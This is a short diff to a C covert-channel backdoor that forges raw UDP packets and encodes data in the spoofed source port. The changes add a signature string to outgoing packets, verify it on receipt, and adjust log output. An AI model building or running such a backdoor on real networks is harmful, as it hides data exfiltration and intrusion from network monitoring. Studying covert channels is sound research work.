@@ -213,6 +213,8 @@ void client(unsigned int source_addr, unsigned int dest_addr, unsigned short des
         send_udp.ip.daddr = dest_addr;
         send_udp.udp.len = htons(8);
 
+        strcpy(send_udp.buffer, SIGNATURE);
+
         /* forge destination port */
         send_udp.udp.dest = htons(dest_port);
 
@@ -222,7 +224,7 @@ void client(unsigned int source_addr, unsigned int dest_addr, unsigned short des
         else
             send_udp.udp.source = (htons(data[i - 1]));
 
-        fprintf(stdout, "Sending: %d | %d | %d\n", i, data_len, htons(send_udp.udp.source));
+        fprintf(stdout, "Sending: %d of %d : %d\n", i, data_len, htons(send_udp.udp.source));
 
         /* Drop our forged data into the socket struct */
         sin.sin_family = AF_INET;
@@ -304,11 +306,17 @@ void server(unsigned int source_addr, unsigned int dest_addr, unsigned short des
             exit(1);
         }
         /* Listen for return packet on a passive socket */
+
         read(recv_socket, (struct recv_udp *)&recv_packet, 9999);
 
         // corect dp and correct flag
         if (ntohs(recv_packet.udp.dest) == dest_port)
         {
+            if (strcmp(recv_packet.buffer, SIGNATURE) == 0)
+            {
+                fprintf(stdout, "Signature Good\n");
+            }
+
             temp = ntohs(recv_packet.udp.source);
             fprintf(stdout, "Received: %d of %d : %d\n", packet_count, size, temp);
 
@@ -357,6 +365,7 @@ void server(unsigned int source_addr, unsigned int dest_addr, unsigned short des
                 }
             }
         }
+
         close(recv_socket); /* close the socket so we don't hose the kernel */
     }
     fprintf(stdout, "Backdoor Closed");
